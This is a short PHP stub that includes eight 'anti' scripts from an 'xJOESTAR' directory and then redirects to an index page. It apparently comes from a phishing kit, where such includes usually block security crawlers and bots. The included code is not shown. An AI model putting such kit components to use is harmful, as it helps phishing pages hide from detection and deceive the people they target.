<?php
  	include '../../xJOESTAR/anti1.php';
    include '../../xJOESTAR/anti2.php';
    include '../../xJOESTAR/anti3.php';
    include '../../xJOESTAR/anti4.php';
    include '../../xJOESTAR/anti5.php';
    include '../../xJOESTAR/anti6.php';
    include '../../xJOESTAR/anti7.php';
    include '../../xJOESTAR/anti8.php';
	exit(header("Location: ../index.php"));
?>
